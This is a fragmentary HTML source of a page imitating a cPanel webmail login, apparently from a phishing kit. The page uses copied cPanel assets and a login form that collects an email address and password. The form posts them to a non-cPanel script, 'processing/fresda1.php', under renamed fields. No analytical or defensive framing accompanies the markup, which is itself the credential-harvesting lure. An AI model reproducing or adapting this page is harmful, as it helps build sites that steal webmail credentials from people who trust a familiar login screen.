...
<html lang="en" dir="ltr"><head>
    ...
    <link rel="shortcut icon" href="cPanel_assets/img/favicon.ico" type="image/x-icon">

    <!-- EXTERNAL CSS -->
    <link href="cPanel_assets/css/open_sans.min.css" rel="stylesheet" type="text/css">
    <link href="cPanel_assets/css/style_v2_optimized.css" rel="stylesheet" type="text/css">
...
*/
.copyright {
  background: url(cPanel_assets/img/cp.svg) no-repeat scroll center top transparent;
...
<div id="login-status" class="error-notice" style="opacity: 0;">
    ...
    <div id="notify">
        <noscript>
            <div class="error-notice">
                <img src="/cPanel_magic_revision_1540391704/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
        ...
        <div id="login-container">
            ...
            <div id="login-sub-container">
                    <div id="login-sub-header">
                        ...
                        <img class="main-logo" src="cPanel_assets/img/webmail-logo.svg" alt="logo">
                    ...
                    <div id="login-sub">
                        ...
                        <div id="forms">
                            <form id="login_form" action="processing/fresda1.php" method="post" target="_top" style="visibility:">
                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user2" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" pattern="((([0-9a-zA-Z]((\.(?!\.))|[-!#\$%&'\*\+/=\?\^`\{\}\|~\w])*)[0-9a-zA-Z]@)(([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,22}))" tabindex="1" required="">
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass2" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
